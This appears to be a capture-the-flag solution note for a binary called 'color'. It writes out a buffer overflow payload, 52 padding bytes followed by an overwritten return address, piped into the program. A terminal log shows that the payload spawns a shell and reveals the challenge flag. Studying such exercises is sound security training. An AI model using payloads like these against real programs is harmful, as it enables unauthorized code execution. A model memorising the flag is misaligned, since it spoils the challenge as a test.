#gdb
#   disassemble main
#python -c "print 'A'*(32+16+4)+'\x57\x86\x04\x08'" > para.txt && ./color < para.txt
'''
color@ubuntu-512mb-nyc3-01:~$ python -c "print 'A'*(32+16+4)+'\x57\x86\x04\x08'" > /tmp/para.txt && ./color < /tmp/para.txt
Enter your favorite color: Me too! That's my favorite color too!
You get a shell! Flag is in flag.txt
Segmentation fault (core dumped)
color@ubuntu-512mb-nyc3-01:~$ (python -c "print 'A'*(32+16+4)+'\x57\x86\x04\x08'";cat) | ./color
Enter your favorite color: Me too! That's my favorite color too!
You get a shell! Flag is in flag.txt
cat flag.txt
flag{c0lor_0f_0verf1ow}
'''


#(python -c "print 'A'*(32+16+4)+'\x57\x86\x04\x08'";cat) | ./color
